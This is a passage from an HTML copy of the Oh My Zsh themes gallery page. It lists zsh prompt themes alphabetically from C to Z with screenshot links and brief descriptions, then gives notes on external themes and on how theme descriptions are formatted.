title="C"></a>C</h2><h3 id="candy"><a href="#candy" class="headerlink" title="candy"></a>candy</h3><p><img src="https://user-images.githubusercontent.com/49100982/108254770-7ba8d180-716c-11eb-965f-63b9ce0efe15.jpg" alt="candy"></p><h3 id="clean"><a href="#clean" class="headerlink" title="clean"></a>clean</h3><p><img src="https://user-images.githubusercontent.com/49100982/108254772-7ba8d180-716c-11eb-9d96-f54d13acde5b.jpg" alt="clean"></p><h3 id="cloud"><a href="#cloud" class="headerlink" title="cloud"></a>cloud</h3><p><img src="https://user-images.githubusercontent.com/49100982/108254774-7c416800-716c-11eb-9ea8-8f8cbac82922.jpg" alt="cloud"></p><h3 id="crcandy"><a href="#crcandy" class="headerlink" title="crcandy"></a>crcandy</h3><p><img src="https://user-images.githubusercontent.com/49100982/108254775-7c416800-716c-11eb-8e54-fa40ccb0d519.jpg" alt="crcandy"></p><h3 id="crunch"><a href="#crunch" class="headerlink" title="crunch"></a>crunch</h3><p><img src="https://user-images.githubusercontent.com/49100982/108254776-7cd9fe80-716c-11eb-889a-84d7b26df847.jpg" alt="crunch"></p><h3 id="cypher"><a href="#cypher" class="headerlink" title="cypher"></a>cypher</h3><p><img src="https://user-images.githubusercontent.com/49100982/108254777-7d729500-716c-11eb-9ab2-232ed00e30aa.jpg" alt="cypher"></p><h2 id="D"><a href="#D" class="headerlink" title="D"></a>D</h2><h3 id="dallas"><a href="#dallas" class="headerlink" title="dallas"></a>dallas</h3><p><img src="https://user-images.githubusercontent.com/49100982/108254779-7d729500-716c-11eb-98b9-ef343be7a8fe.jpg" alt="dallas"></p><h3 id="darkblood"><a href="#darkblood" class="headerlink" title="darkblood"></a>darkblood</h3><p><img src="https://user-images.githubusercontent.com/49100982/108254782-7e0b2b80-716c-11eb-95db-b149bc1c0032.jpg" alt="darkblood"></p><h3 id="daveverwer"><a href="#daveverwer" class="headerlink" title="daveverwer"></a>daveverwer</h3><p><img src="https://user-images.githubusercontent.com/1816101/62961143-7e4e9c00-bdfc-11e9-9777-ce1f230de9d7.jpg" alt="daveverwer"></p><h3 id="dieter"><a href="#dieter" class="headerlink" title="dieter"></a>dieter</h3><p><img src="https://user-images.githubusercontent.com/49100982/108254786-7ea3c200-716c-11eb-9c33-d24d404d4e25.jpg" alt="dieter"></p><h3 id="dogenpunk"><a href="#dogenpunk" class="headerlink" title="dogenpunk"></a>dogenpunk</h3><p><img src="https://user-images.githubusercontent.com/49100982/108254788-7f3c5880-716c-11eb-96e3-27cc0d6297d3.jpg" alt="dogenpunk"></p><h3 id="dpoggi"><a href="#dpoggi" class="headerlink" title="dpoggi"></a>dpoggi</h3><p><img src="https://user-images.githubusercontent.com/49100982/108254790-7fd4ef00-716c-11eb-821e-d11fba0c4f10.jpg" alt="dpoggi"></p><h3 id="dst"><a href="#dst" class="headerlink" title="dst"></a>dst</h3><p><img src="https://user-images.githubusercontent.com/49100982/108254792-7fd4ef00-716c-11eb-8fa7-67d845b771be.jpg" alt="dst"></p><h3 id="dstufft"><a href="#dstufft" class="headerlink" title="dstufft"></a>dstufft</h3><p><img src="https://user-images.githubusercontent.com/49100982/108254797-806d8580-716c-11eb-9ec5-ae1b23d0a7cd.jpg" alt="dstufft"></p><h3 id="duellj"><a href="#duellj" class="headerlink" title="duellj"></a>duellj</h3><p><img src="https://user-images.githubusercontent.com/49100982/108254799-806d8580-716c-11eb-9f1e-2634dc9309d3.jpg" alt="duellj"></p><h2 id="E"><a href="#E" class="headerlink" title="E"></a>E</h2><h3 id="eastwood"><a href="#eastwood" class="headerlink" title="eastwood"></a>eastwood</h3><p><img src="https://user-images.githubusercontent.com/49100982/108254800-81061c00-716c-11eb-858e-aa17d4c5e07e.jpg" alt="eastwood"></p><h3 id="edvardm"><a href="#edvardm" class="headerlink" title="edvardm"></a>edvardm</h3><p><img src="https://user-images.githubusercontent.com/49100982/108254801-819eb280-716c-11eb-9279-01b8ef95c734.jpg" alt="edvardm"></p><h3 id="emotty"><a href="#emotty" class="headerlink" title="emotty"></a>emotty</h3><p><img src="https://user-images.githubusercontent.com/49100982/108254802-819eb280-716c-11eb-9d66-d21bb1e7196c.jpg" alt="emotty"></p><h3 id="essembeh"><a href="#essembeh" class="headerlink" title="essembeh"></a>essembeh</h3><p><img src="https://user-images.githubusercontent.com/49100982/108254803-82374900-716c-11eb-9510-ef560d31e7e7.jpg" alt="essembeh"></p><h3 id="evan"><a href="#evan" class="headerlink" title="evan"></a>evan</h3><p><img src="https://user-images.githubusercontent.com/49100982/108254804-82374900-716c-11eb-9636-71abb16053df.jpg" alt="evan"></p><h2 id="F"><a href="#F" class="headerlink" title="F"></a>F</h2><h3 id="fino-time"><a href="#fino-time" class="headerlink" title="fino-time"></a>fino-time</h3><p><img src="https://user-images.githubusercontent.com/49100982/108254806-82cfdf80-716c-11eb-9bbc-2d9648109b31.jpg" alt="fino-time"></p><h3 id="fino"><a href="#fino" class="headerlink" title="fino"></a>fino</h3><p><img src="https://user-images.githubusercontent.com/49100982/108254809-82cfdf80-716c-11eb-8d66-027fe4ecfd55.jpg" alt="fino"></p><h3 id="fishy"><a href="#fishy" class="headerlink" title="fishy"></a>fishy</h3><p><img src="https://user-images.githubusercontent.com/49100982/108254811-83687600-716c-11eb-88df-2d1fb721a62b.jpg" alt="fishy"></p><p>The fish shell prompt with git support</p><h3 id="flazz"><a href="#flazz" class="headerlink" title="flazz"></a>flazz</h3><p><img src="https://user-images.githubusercontent.com/49100982/108254813-83687600-716c-11eb-98dc-083a14aae6e1.jpg" alt="flazz"></p><p>Has git and vi-command mode support (when enabled)</p><h3 id="fletcherm"><a href="#fletcherm" class="headerlink" title="fletcherm"></a>fletcherm</h3><p><img src="https://user-images.githubusercontent.com/49100982/108254817-84010c80-716c-11eb-8d56-81bc95a46ef5.jpg" alt="fletcherm"></p><h3 id="fox"><a href="#fox" class="headerlink" title="fox"></a>fox</h3><p><img src="https://user-images.githubusercontent.com/49100982/108254819-8499a300-716c-11eb-9c13-c6fd49d72a6c.jpg" alt="fox"></p><h3 id="frisk"><a href="#frisk" class="headerlink" title="frisk"></a>frisk</h3><p><img src="https://user-images.githubusercontent.com/49100982/108254820-8499a300-716c-11eb-922d-5cc6ffa08fc1.jpg" alt="frisk"></p><h3 id="frontcube"><a href="#frontcube" class="headerlink" title="frontcube"></a>frontcube</h3><p><img src="https://user-images.githubusercontent.com/49100982/108254821-85323980-716c-11eb-90b9-fc0b4b014f36.jpg" alt="frontcube"></p><h3 id="funky"><a href="#funky" class="headerlink" title="funky"></a>funky</h3><p><img src="https://user-images.githubusercontent.com/49100982/108254822-85323980-716c-11eb-8422-69480dce0f62.jpg" alt="funky"></p><p>It’s funky…</p><h3 id="fwalch"><a href="#fwalch" class="headerlink" title="fwalch"></a>fwalch</h3><p><img src="https://user-images.githubusercontent.com/49100982/108254824-85cad000-716c-11eb-9b7a-fe9e24131df7.jpg" alt="fwalch"></p><h1 id="G"><a href="#G" class="headerlink" title="G"></a>G</h1><h3 id="gallifrey"><a href="#gallifrey" class="headerlink" title="gallifrey"></a>gallifrey</h3><p><img src="https://user-images.githubusercontent.com/49100982/108254827-86636680-716c-11eb-94e2-64318cb21f3b.jpg" alt="gallifrey"></p><h3 id="gallois"><a href="#gallois" class="headerlink" title="gallois"></a>gallois</h3><p><img src="https://user-images.githubusercontent.com/49100982/108254828-86636680-716c-11eb-8d3a-146431df149f.jpg" alt="gallois"></p><h3 id="garyblessington"><a href="#garyblessington" class="headerlink" title="garyblessington"></a>garyblessington</h3><p><img src="https://user-images.githubusercontent.com/49100982/108254830-86fbfd00-716c-11eb-8e9e-57cb190cd35b.jpg" alt="garyblessington"></p><h3 id="gentoo"><a href="#gentoo" class="headerlink" title="gentoo"></a>gentoo</h3><p><img src="https://user-images.githubusercontent.com/49100982/108254832-86fbfd00-716c-11eb-8bbf-7840e84b4c44.jpg" alt="gentoo"></p><h3 id="geoffgarside"><a href="#geoffgarside" class="headerlink" title="geoffgarside"></a>geoffgarside</h3><p><img src="https://user-images.githubusercontent.com/49100982/108254834-87949380-716c-11eb-8ff7-9a494c650852.jpg" alt="geoffgarside"></p><h3 id="gianu"><a href="#gianu" class="headerlink" title="gianu"></a>gianu</h3><p><img src="https://user-images.githubusercontent.com/49100982/108254836-87949380-716c-11eb-8d5b-a4b24ea53f67.jpg" alt="gianu"></p><h3 id="gnzh"><a href="#gnzh" class="headerlink" title="gnzh"></a>gnzh</h3><p><img src="https://user-images.githubusercontent.com/49100982/108254837-882d2a00-716c-11eb-9f49-3b5e6e62eb52.jpg" alt="gnzh"></p><h3 id="gozilla"><a href="#gozilla" class="headerlink" title="gozilla"></a>gozilla</h3><p><img src="https://user-images.githubusercontent.com/49100982/108254838-88c5c080-716c-11eb-9bd9-4d88b870f04f.jpg" alt="gozilla"></p><h2 id="H"><a href="#H" class="headerlink" title="H"></a>H</h2><h3 id="half-life"><a href="#half-life" class="headerlink" title="half-life"></a>half-life</h3><p><img src="https://user-images.githubusercontent.com/49100982/108254840-88c5c080-716c-11eb-9971-f2cfbf54f91a.jpg" alt="half-life"></p><h3 id="humza"><a href="#humza" class="headerlink" title="humza"></a>humza</h3><p><img src="https://user-images.githubusercontent.com/49100982/108254841-895e5700-716c-11eb-9984-ab8ec70ad92e.jpg" alt="humza"></p><h1 id="I"><a href="#I" class="headerlink" title="I"></a>I</h1><h3 id="imajes"><a href="#imajes" class="headerlink" title="imajes"></a>imajes</h3><p><img src="https://user-images.githubusercontent.com/49100982/108254845-895e5700-716c-11eb-807f-0ecb0aa4db00.jpg" alt="imajes"></p><h3 id="intheloop"><a href="#intheloop" class="headerlink" title="intheloop"></a>intheloop</h3><p><img src="https://user-images.githubusercontent.com/49100982/108254849-89f6ed80-716c-11eb-8e92-dcf5e576df64.jpg" alt="intheloop"></p><h3 id="itchy"><a href="#itchy" class="headerlink" title="itchy"></a>itchy</h3><p><img src="https://user-images.githubusercontent.com/49100982/108254851-89f6ed80-716c-11eb-9922-185b952b24db.jpg" alt="itchy"></p><h1 id="J"><a href="#J" class="headerlink" title="J"></a>J</h1><h3 id="jaischeema"><a href="#jaischeema" class="headerlink" title="jaischeema"></a>jaischeema</h3><p><img src="https://user-images.githubusercontent.com/49100982/108254853-8a8f8400-716c-11eb-9775-780e00c3f680.jpg" alt="jaischeema"></p><h3 id="jbergantine"><a href="#jbergantine" class="headerlink" title="jbergantine"></a>jbergantine</h3><p><img src="https://user-images.githubusercontent.com/49100982/108254855-8b281a80-716c-11eb-960d-2f2cf8e5153f.jpg" alt="jbergantine"></p><h3 id="jispwoso"><a href="#jispwoso" class="headerlink" title="jispwoso"></a>jispwoso</h3><p><img src="https://user-images.githubusercontent.com/49100982/108254857-8bc0b100-716c-11eb-808f-d0b6f1a16774.jpg" alt="jispwoso"></p><h3 id="jnrowe"><a href="#jnrowe" class="headerlink" title="jnrowe"></a>jnrowe</h3><p><img src="https://user-images.githubusercontent.com/49100982/108254859-8bc0b100-716c-11eb-998b-4ee8bb6c1f3f.jpg" alt="jnrowe"></p><h3 id="jonathan"><a href="#jonathan" class="headerlink" title="jonathan"></a>jonathan</h3><p><img src="https://user-images.githubusercontent.com/49100982/108254860-8c594780-716c-11eb-8f8b-be04d4943216.jpg" alt="jonathan"></p><h3 id="josh"><a href="#josh" class="headerlink" title="josh"></a>josh</h3><p><img src="https://user-images.githubusercontent.com/49100982/108254862-8cf1de00-716c-11eb-8bfe-f2e46376a10f.jpg" alt="josh"></p><h3 id="jreese"><a href="#jreese" class="headerlink" title="jreese"></a>jreese</h3><p><img src="https://user-images.githubusercontent.com/49100982/108254863-8cf1de00-716c-11eb-935f-87cc85ef6ed7.jpg" alt="jreese"></p><h3 id="jtriley"><a href="#jtriley" class="headerlink" title="jtriley"></a>jtriley</h3><p><img src="https://user-images.githubusercontent.com/49100982/108254869-8d8a7480-716c-11eb-8857-ee82b1fe4023.jpg" alt="jtriley"></p><h3 id="juanghurtado"><a href="#juanghurtado" class="headerlink" title="juanghurtado"></a>juanghurtado</h3><p><img src="https://user-images.githubusercontent.com/49100982/108254872-8d8a7480-716c-11eb-9782-4a37a851ce1f.jpg" alt="juanghurtado"></p><h3 id="junkfood"><a href="#junkfood" class="headerlink" title="junkfood"></a>junkfood</h3><p><img src="https://user-images.githubusercontent.com/49100982/108254874-8e230b00-716c-11eb-90ea-e4f66c9a3dd6.jpg" alt="junkfood"></p><blockquote><p>Totally ripped off Dallas theme</p></blockquote><p><a href="https://www.tylercipriani.com/2012/12/18/zsh-prompt-customization.html">More Info</a></p><h2 id="K"><a href="#K" class="headerlink" title="K"></a>K</h2><h3 id="kafeitu"><a href="#kafeitu" class="headerlink" title="kafeitu"></a>kafeitu</h3><p><img src="https://user-images.githubusercontent.com/49100982/108254876-8e230b00-716c-11eb-9adb-50d695796563.jpg" alt="kafeitu"></p><h3 id="kardan"><a href="#kardan" class="headerlink" title="kardan"></a>kardan</h3><p><img src="https://user-images.githubusercontent.com/49100982/108254877-8ebba180-716c-11eb-9fb5-9b0437433305.jpg" alt="kardan"></p><h3 id="kennethreitz"><a href="#kennethreitz" class="headerlink" title="kennethreitz"></a>kennethreitz</h3><p><img src="https://user-images.githubusercontent.com/49100982/108254878-8f543800-716c-11eb-9373-a3e4e19b58ae.jpg" alt="kennethreitz"></p><h3 id="kolo"><a href="#kolo" class="headerlink" title="kolo"></a>kolo</h3><p><img src="https://user-images.githubusercontent.com/49100982/108254881-8f543800-716c-11eb-8115-2232727264d6.jpg" alt="kolo"></p><h3 id="kphoen"><a href="#kphoen" class="headerlink" title="kphoen"></a>kphoen</h3><p><img src="https://user-images.githubusercontent.com/49100982/108254883-8fecce80-716c-11eb-9a4d-ad5c465af835.jpg" alt="kphoen"></p><h1 id="L"><a href="#L" class="headerlink" title="L"></a>L</h1><h3 id="lambda"><a href="#lambda" class="headerlink" title="lambda"></a>lambda</h3><p><img src="https://user-images.githubusercontent.com/49100982/108254885-8fecce80-716c-11eb-8012-aabac630c475.jpg" alt="lambda"></p><h3 id="linuxonly"><a href="#linuxonly" class="headerlink" title="linuxonly"></a>linuxonly</h3><p><img src="https://user-images.githubusercontent.com/49100982/108254886-90856500-716c-11eb-81e8-8ba2b7ea922f.jpg" alt="linuxonly"></p><p>(As the name states, this only works on Linux)</p><h3 id="lukerandall"><a href="#lukerandall" class="headerlink" title="lukerandall"></a>lukerandall</h3><p><img src="https://user-images.githubusercontent.com/49100982/108254887-911dfb80-716c-11eb-99a0-275b35afd9ce.jpg" alt="lukerandall"></p><h2 id="M"><a href="#M" class="headerlink" title="M"></a>M</h2><h3 id="macovsky"><a href="#macovsky" class="headerlink" title="macovsky"></a>macovsky</h3><p><img src="https://user-images.githubusercontent.com/49100982/108254888-911dfb80-716c-11eb-9595-b08415fb1c17.jpg" alt="macovsky"></p><h3 id="maran"><a href="#maran" class="headerlink" title="maran"></a>maran</h3><p><img src="https://user-images.githubusercontent.com/49100982/108254890-91b69200-716c-11eb-8fa3-108c8692087c.jpg" alt="maran"></p><h3 id="mgutz"><a href="#mgutz" class="headerlink" title="mgutz"></a>mgutz</h3><p><img src="https://user-images.githubusercontent.com/49100982/108254893-91b69200-716c-11eb-9f6c-221967f1adc6.jpg" alt="mgutz"></p><h3 id="mh"><a href="#mh" class="headerlink" title="mh"></a>mh</h3><p><img src="https://user-images.githubusercontent.com/49100982/108254896-924f2880-716c-11eb-83fe-be8f732f46da.jpg" alt="mh"></p><h3 id="michelebologna"><a href="#michelebologna" class="headerlink" title="michelebologna"></a>michelebologna</h3><p><img src="https://user-images.githubusercontent.com/49100982/108254897-92e7bf00-716c-11eb-86b8-bf00a43d6a43.jpg" alt="michelebologna"></p><h3 id="mikeh"><a href="#mikeh" class="headerlink" title="mikeh"></a>mikeh</h3><p><img src="https://user-images.githubusercontent.com/49100982/108254900-93805580-716c-11eb-9e39-5e8dda6c2308.jpg" alt="mikeh"></p><h3 id="miloshadzic"><a href="#miloshadzic" class="headerlink" title="miloshadzic"></a>miloshadzic</h3><p><img src="https://user-images.githubusercontent.com/49100982/108254899-93805580-716c-11eb-84d6-822e33ad5ffb.jpg" alt="miloshadzic"></p><h3 id="minimal"><a href="#minimal" class="headerlink" title="minimal"></a>minimal</h3><p><img src="https://user-images.githubusercontent.com/49100982/108254900-93805580-716c-11eb-9e39-5e8dda6c2308.jpg" alt="minimal"></p><h3 id="mortalscumbag"><a href="#mortalscumbag" class="headerlink" title="mortalscumbag"></a>mortalscumbag</h3><p><img src="https://user-images.githubusercontent.com/49100982/108254901-9418ec00-716c-11eb-9439-6dd4621e6784.jpg" alt="mortalscumbag"></p><p>Also tells you when logged in over ssh</p><h3 id="mrtazz"><a href="#mrtazz" class="headerlink" title="mrtazz"></a>mrtazz</h3><p><img src="https://user-images.githubusercontent.com/49100982/108254902-9418ec00-716c-11eb-9001-6a5abecf0aa1.jpg" alt="mrtazz"></p><h3 id="murilasso"><a href="#murilasso" class="headerlink" title="murilasso"></a>murilasso</h3><p><img src="https://user-images.githubusercontent.com/1816101/62966002-6419bb80-be06-11e9-90f0-7ef55042e6e9.jpg" alt="murilasso"></p><h3 id="muse"><a href="#muse" class="headerlink" title="muse"></a>muse</h3><p><img src="https://user-images.githubusercontent.com/49100982/108254905-954a1900-716c-11eb-820c-15814dd13a7d.jpg" alt="muse"></p><h2 id="N"><a href="#N" class="headerlink" title="N"></a>N</h2><h3 id="nanotech"><a href="#nanotech" class="headerlink" title="nanotech"></a>nanotech</h3><p><img src="https://user-images.githubusercontent.com/49100982/108254907-954a1900-716c-11eb-8be4-d8accb5a2a44.jpg" alt="nanotech"></p><h3 id="nebirhos"><a href="#nebirhos" class="headerlink" title="nebirhos"></a>nebirhos</h3><p><img src="https://user-images.githubusercontent.com/49100982/108254909-95e2af80-716c-11eb-8d16-d78875d9263a.jpg" alt="nebirhos"></p><h3 id="nicoulaj"><a href="#nicoulaj" class="headerlink" title="nicoulaj"></a>nicoulaj</h3><p><img src="https://user-images.githubusercontent.com/49100982/108254911-95e2af80-716c-11eb-811d-e8ea16f6ee0c.jpg" alt="nicoulaj"></p><h3 id="norm"><a href="#norm" class="headerlink" title="norm"></a>norm</h3><p><img src="https://user-images.githubusercontent.com/49100982/108254912-967b4600-716c-11eb-8e3e-eb5487570074.jpg" alt="norm"></p><h2 id="O"><a href="#O" class="headerlink" title="O"></a>O</h2><h3 id="obraun"><a href="#obraun" class="headerlink" title="obraun"></a>obraun</h3><p><img src="https://user-images.githubusercontent.com/49100982/108254914-967b4600-716c-11eb-8c11-830bc97f274e.jpg" alt="obraun"></p><h2 id="P"><a href="#P" class="headerlink" title="P"></a>P</h2><h3 id="peepcode"><a href="#peepcode" class="headerlink" title="peepcode"></a>peepcode</h3><p><img src="https://user-images.githubusercontent.com/49100982/108254917-9713dc80-716c-11eb-8f73-69c67ced32a7.jpg" alt="peepcode"></p><h3 id="philips"><a href="#philips" class="headerlink" title="philips"></a>philips</h3><p><img src="https://user-images.githubusercontent.com/49100982/108254919-97ac7300-716c-11eb-9338-cb7009d3a5ea.jpg" alt="philips"></p><h3 id="pmcgee"><a href="#pmcgee" class="headerlink" title="pmcgee"></a>pmcgee</h3><p><img src="https://user-images.githubusercontent.com/49100982/108254920-97ac7300-716c-11eb-80d5-301ba10cf969.jpg" alt="pmcgee"></p><h3 id="pygmalion"><a href="#pygmalion" class="headerlink" title="pygmalion"></a>pygmalion</h3><p><img src="https://user-images.githubusercontent.com/49100982/108254921-98450980-716c-11eb-9d27-18562610887f.jpg" alt="pygmalion"></p><h2 id="R"><a href="#R" class="headerlink" title="R"></a>R</h2><h3 id="re5et"><a href="#re5et" class="headerlink" title="re5et"></a>re5et</h3><p><img src="https://user-images.githubusercontent.com/49100982/108254922-98450980-716c-11eb-88af-2e1c1ba5c5fe.jpg" alt="re5et"></p><h3 id="refined"><a href="#refined" class="headerlink" title="refined"></a>refined</h3><p><img src="https://user-images.githubusercontent.com/49100982/108255729-b2cbb280-716d-11eb-8869-d612e2344ef5.jpg" alt="refined"></p><h3 id="rgm"><a href="#rgm" class="headerlink" title="rgm"></a>rgm</h3><p><img src="https://user-images.githubusercontent.com/49100982/108255732-b2cbb280-716d-11eb-8587-f8b412c48907.jpg" alt="rgm"></p><h3 id="risto"><a href="#risto" class="headerlink" title="risto"></a>risto</h3><p><img src="https://user-images.githubusercontent.com/49100982/108255733-b3644900-716d-11eb-8fea-4ce136198782.jpg" alt="risto"></p><h3 id="rixius"><a href="#rixius" class="headerlink" title="rixius"></a>rixius</h3><p><img src="https://user-images.githubusercontent.com/49100982/108255734-b3fcdf80-716d-11eb-8e9b-b8c7c7546e75.jpg" alt="rixius"></p><h3 id="rkj-repos"><a href="#rkj-repos" class="headerlink" title="rkj-repos"></a>rkj-repos</h3><p><img src="https://user-images.githubusercontent.com/49100982/108255735-b3fcdf80-716d-11eb-92ee-678fd1bff92f.jpg" alt="rkj"></p><h2 id="S"><a href="#S" class="headerlink" title="S"></a>S</h2><h3 id="sammy"><a href="#sammy" class="headerlink" title="sammy"></a>sammy</h3><p><img src="https://user-images.githubusercontent.com/49100982/108255736-b4957600-716d-11eb-848a-f4b9a83a58c7.jpg" alt="sammy"></p><h3 id="simonoff"><a href="#simonoff" class="headerlink" title="simonoff"></a>simonoff</h3><p><img src="https://user-images.githubusercontent.com/49100982/108255738-b4957600-716d-11eb-8dea-87c1764d7e35.jpg" alt="simonoff"></p><h3 id="simple"><a href="#simple" class="headerlink" title="simple"></a>simple</h3><p><img src="https://user-images.githubusercontent.com/49100982/108255740-b52e0c80-716d-11eb-8645-d1ed285204f9.jpg" alt="simple"></p><h3 id="skaro"><a href="#skaro" class="headerlink" title="skaro"></a>skaro</h3><p><img src="https://user-images.githubusercontent.com/49100982/108255742-b52e0c80-716d-11eb-8ea1-8a6aa361fe96.jpg" alt="skaro"></p><h3 id="smt"><a href="#smt" class="headerlink" title="smt"></a>smt</h3><p><img src="https://user-images.githubusercontent.com/49100982/108255743-b5c6a300-716d-11eb-9f64-185f288c1364.jpg" alt="smt"></p><h3 id="Soliah"><a href="#Soliah" class="headerlink" title="Soliah"></a>Soliah</h3><p><img src="https://user-images.githubusercontent.com/49100982/108255747-b65f3980-716d-11eb-8e12-1ce6cf4d009f.jpg" alt="Soliah"></p><h3 id="sonicradish"><a href="#sonicradish" class="headerlink" title="sonicradish"></a>sonicradish</h3><p><img src="https://user-images.githubusercontent.com/49100982/108255750-b65f3980-716d-11eb-9dfc-620748a03844.jpg" alt="sonicradish"></p><h3 id="sorin"><a href="#sorin" class="headerlink" title="sorin"></a>sorin</h3><p><img src="https://user-images.githubusercontent.com/49100982/108255752-b6f7d000-716d-11eb-8415-3d5d18839646.jpg" alt="sorin"></p><h3 id="sporty-256"><a href="#sporty-256" class="headerlink" title="sporty_256"></a>sporty_256</h3><p><img src="https://user-images.githubusercontent.com/49100982/108255753-b6f7d000-716d-11eb-96b7-7448b890a583.jpg" alt="sporty_256"></p><h3 id="steeef"><a href="#steeef" class="headerlink" title="steeef"></a>steeef</h3><p><img src="https://user-images.githubusercontent.com/49100982/108255754-b7906680-716d-11eb-9e70-4d79fdd62a2a.jpg" alt="steeef"></p><h3 id="strug"><a href="#strug" class="headerlink" title="strug"></a>strug</h3><p><img src="https://user-images.githubusercontent.com/49100982/108255755-b828fd00-716d-11eb-8dee-2d981777a2b3.jpg" alt="strug"></p><h3 id="sunaku"><a href="#sunaku" class="headerlink" title="sunaku"></a>sunaku</h3><p><img src="https://user-images.githubusercontent.com/49100982/108255759-b828fd00-716d-11eb-8951-0af2c0ac1297.jpg" alt="sunaku"></p><p>Exit status if nonzero, status &amp; branch if git, <code>pwd</code> always.</p><h3 id="sunrise"><a href="#sunrise" class="headerlink" title="sunrise"></a>sunrise</h3><p><img src="https://user-images.githubusercontent.com/49100982/108255761-b8c19380-716d-11eb-8c73-02da22b53021.jpg" alt="sunrise"></p><p>Lightweight prompt with exit status and <code>git status</code> consistent mode line.</p><h3 id="superjarin"><a href="#superjarin" class="headerlink" title="superjarin"></a>superjarin</h3><p><img src="https://user-images.githubusercontent.com/49100982/108255762-b8c19380-716d-11eb-8ab2-de382c6dd78e.jpg" alt="superjarin"></p><p>Git status, git branch, and ruby, all in a no muss, no fuss prompt! Works with RVM, chruby, and rbenv (just activate the corresponding plugin).</p><h3 id="suvash"><a href="#suvash" class="headerlink" title="suvash"></a>suvash</h3><p><img src="https://user-images.githubusercontent.com/49100982/108255766-b95a2a00-716d-11eb-905e-bad027eacc41.jpg" alt="suvash"></p><p>Username, host, directory, git branch and rvm gemset</p><h2 id="T"><a href="#T" class="headerlink" title="T"></a>T</h2><h3 id="takashiyoshida"><a href="#takashiyoshida" class="headerlink" title="takashiyoshida"></a>takashiyoshida</h3><p><img src="https://user-images.githubusercontent.com/49100982/108255767-b95a2a00-716d-11eb-9750-41c3b6036529.jpg" alt="takashiyoshida"></p><h3 id="terminalparty"><a href="#terminalparty" class="headerlink" title="terminalparty"></a>terminalparty</h3><p><img src="https://user-images.githubusercontent.com/49100982/108255770-b9f2c080-716d-11eb-8e79-068a5ed7ee7a.jpg" alt="terminalparty"></p><p>There is a party every day.</p><h3 id="theunraveler"><a href="#theunraveler" class="headerlink" title="theunraveler"></a>theunraveler</h3><p><img src="https://user-images.githubusercontent.com/49100982/108255772-ba8b5700-716d-11eb-99cc-53d05b5bf20c.jpg" alt="theunraveler"></p><p>Minimal, informative when it needs to be.</p><h3 id="tjkirch"><a href="#tjkirch" class="headerlink" title="tjkirch"></a>tjkirch</h3><p><img src="https://user-images.githubusercontent.com/49100982/108255774-ba8b5700-716d-11eb-80f2-213a9932fb0a.jpg" alt="tjkirch"></p><p>Based on dst, plus a lightning bolt and return codes.</p><h3 id="tonotdo"><a href="#tonotdo" class="headerlink" title="tonotdo"></a>tonotdo</h3><p><img src="https://user-images.githubusercontent.com/49100982/108255775-bb23ed80-716d-11eb-9ec4-ea00690300bb.jpg" alt="tonotdo"></p><h3 id="trapd00r"><a href="#trapd00r" class="headerlink" title="trapd00r"></a>trapd00r</h3><p><img src="https://user-images.githubusercontent.com/49100982/108255776-bb23ed80-716d-11eb-9ada-24b61a3d4afe.jpg" alt="trapd00r"></p><h2 id="W"><a href="#W" class="headerlink" title="W"></a>W</h2><h3 id="wedisagree"><a href="#wedisagree" class="headerlink" title="wedisagree"></a>wedisagree</h3><p><img src="https://user-images.githubusercontent.com/49100982/108255779-bbbc8400-716d-11eb-98e9-3d0993efe2c3.jpg" alt="wedisagree"></p><p>Instructions to further customize the theme are available as comments in the theme file.</p><h3 id="wezm"><a href="#wezm" class="headerlink" title="wezm"></a>wezm</h3><p><img src="https://user-images.githubusercontent.com/49100982/108255780-bbbc8400-716d-11eb-83b2-b9a4ba63bdbf.jpg" alt="wezm"></p><h3 id="wezm-1"><a href="#wezm-1" class="headerlink" title="wezm+"></a>wezm+</h3><p><img src="https://user-images.githubusercontent.com/49100982/108255782-bc551a80-716d-11eb-9347-c841028b8c1a.jpg" alt="wezm+"></p><h3 id="wuffers"><a href="#wuffers" class="headerlink" title="wuffers"></a>wuffers</h3><p><img src="https://user-images.githubusercontent.com/49100982/108255783-bcedb100-716d-11eb-9330-e1d16aeaf994.jpg" alt="wuffers"></p><h2 id="X"><a href="#X" class="headerlink" title="X"></a>X</h2><h3 id="xiong-chiamiov"><a href="#xiong-chiamiov" class="headerlink" title="xiong-chiamiov"></a>xiong-chiamiov</h3><p><img src="https://user-images.githubusercontent.com/49100982/108255788-bd864780-716d-11eb-87b1-01cab8ee3f93.jpg" alt="xiong-chiamiov-plus"></p><h3 id="xiong-chiamiov-plus"><a href="#xiong-chiamiov-plus" class="headerlink" title="xiong-chiamiov-plus"></a>xiong-chiamiov-plus</h3><p><img src="https://user-images.githubusercontent.com/49100982/108255786-bcedb100-716d-11eb-9f4d-540b75cc62c2.jpg" alt="xiong-chiamiov"></p><h2 id="Y"><a href="#Y" class="headerlink" title="Y"></a>Y</h2><h3 id="ys"><a href="#ys" class="headerlink" title="ys"></a>ys</h3><p><img src="https://user-images.githubusercontent.com/49100982/108255792-be1ede00-716d-11eb-8c26-f7ad7ab3c4f2.jpg" alt="ys"></p><p>Clean, simple, compatible and meaningful.Tested on Linux, Unix and Windows under ANSI colors. It is recommended to use with a dark background.</p><p><a href="https://blog.ysmood.org/my-ys-terminal-theme/">More info</a></p><h2 id="Z"><a href="#Z" class="headerlink" title="Z"></a>Z</h2><h3 id="zhann"><a href="#zhann" class="headerlink" title="zhann"></a>zhann</h3><p><img src="https://user-images.githubusercontent.com/49100982/108255796-be1ede00-716d-11eb-8b61-9a419ebe7a4a.jpg" alt="zhann"></p><hr><h2 id="More-themes"><a href="#More-themes" class="headerlink" title="More themes"></a>More themes</h2><p>You can find more themes <a href="https://github.com/robbyrussell/oh-my-zsh/wiki/External-themes">here</a>.</p><h2 id="Don’t-Send-us-your-theme-for-now"><a href="#Don’t-Send-us-your-theme-for-now" class="headerlink" title="(Don’t) Send us your theme! (for now)"></a>(Don’t) Send us your theme! (for now)</h2><p>We have enough themes for the time being. Please fork the project and add on in there, you can let people know how to grab it from there.</p><p>Or put into a Gist and add it to the <a href="https://github.com/robbyrussell/oh-my-zsh/wiki/External-themes">External Themes list</a>.</p><h2 id="Theme-Description-Format"><a href="#Theme-Description-Format" class="headerlink" title="Theme Description Format"></a>Theme Description Format</h2><p>The theme descriptions in this page should contain:</p><ul><li>The name of the theme</li><li>A screenshot<ul><li>(Preferably in PNG format, and hosted on a GitHub issue)</li></ul></li><li>Instructions for any configuration besides setting <code>ZSH_THEME</code> in <code>~/.zshrc</code><ul><li>For example, font installation, terminal color scheme configuration, or optional environment variables that affect the theme</li></ul></li><li>Any dependencies outside Oh My 